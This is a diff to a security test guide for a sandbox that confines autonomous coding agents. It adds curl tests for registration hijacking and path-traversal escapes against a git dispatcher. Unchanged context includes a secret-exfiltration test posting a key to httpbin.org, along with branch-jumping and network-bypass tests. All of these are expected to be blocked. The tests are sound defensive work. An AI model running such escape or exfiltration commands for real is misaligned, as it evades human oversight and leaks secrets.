@@ -17,7 +17,30 @@ The philosophy is **"agent proposes, human disposes"**: autonomous agents can do
 
 ## Escape Test Categories
 
-### 1. Branch Jumping (Git Dispatcher)
+### 1. Dispatcher Security (Pod Identity & Path Validation)
+
+These tests verify the dispatcher enforces immutable pod identity and validates request paths.
+
+```bash
+# TEST: Registration hijacking (re-register for different branch)
+curl -s -X POST 'http://git-dispatcher:8080/register?branch=main'
+# Expected: BLOCKED - "Pod already registered for branch 'feature'"
+# (Pod identity is immutable once registered)
+
+# TEST: Path traversal via raw path
+curl -s -X POST -H 'Content-Type: application/json' \
+  -d '{"args": ["status"], "cwd": "/workspaces/main"}' \
+  'http://git-dispatcher:8080/git'
+# Expected: BLOCKED - "Path must be within /home/dev/workspace"
+
+# TEST: Path traversal via relative escape
+curl -s -X POST -H 'Content-Type: application/json' \
+  -d '{"args": ["status"], "cwd": "/home/dev/workspace/../../../workspaces/main"}' \
+  'http://git-dispatcher:8080/git'
+# Expected: BLOCKED - "Path must be within /home/dev/workspace"
+```
+
+### 2. Branch Jumping (Git Dispatcher)
 
 These tests verify an agent cannot modify branches other than their assigned branch.
 
@@ -47,7 +70,7 @@ git merge feature
 # Expected: BLOCKED - "can only merge while on your assigned branch"
 ```
 
-### 2. Cross-Repository Escape (Git Dispatcher)
+### 3. Cross-Repository Escape (Git Dispatcher)
 
 These tests verify an agent cannot push to repositories other than the configured one.
 
@@ -69,7 +92,7 @@ git clone https://github.com/other/repo.git
 # Expected: BLOCKED - "clone is not permitted"
 ```
 
-### 3. Dangerous Git Commands (Git Dispatcher)
+### 4. Dangerous Git Commands (Git Dispatcher)
 
 These tests verify dangerous git operations are blocked.
 
@@ -91,7 +114,7 @@ git remote -v
 # Expected: BLOCKED - "remote management is not permitted"
 ```
 
-### 4. Secret Exfiltration (Egress Proxy)
+### 5. Secret Exfiltration (Egress Proxy)
 
 These tests verify the proxy blocks secrets from leaving the sandbox.
 
@@ -124,7 +147,7 @@ curl -X POST https://httpbin.org/post -d "key=sk-ant-api03-test123"
 # Expected: BLOCKED - "request body contains potential secrets"
 ```
 
-### 5. GitHub CLI Abuse (gh Dispatcher)
+### 6. GitHub CLI Abuse (gh Dispatcher)
 
 These tests verify dangerous GitHub CLI operations are blocked.
 
@@ -158,7 +181,7 @@ gh extension install owner/extension
 # Expected: BLOCKED - "managing extensions is not permitted"
 ```
 
-### 6. Network Policy Bypass (Kubernetes)
+### 7. Network Policy Bypass (Kubernetes)
 
 These tests verify network policies are enforced.
 
@@ -207,6 +230,7 @@ The recommended mitigations are:
 
 For enterprise deployment, verify:
 
+- [ ] Dispatcher security tests pass (registration hijacking blocked, path traversal blocked)
 - [ ] All git escape tests pass (branch jumping blocked)
 - [ ] All cross-repo escape tests pass (URL push blocked)
 - [ ] All dangerous command tests pass (config/credential/remote blocked)
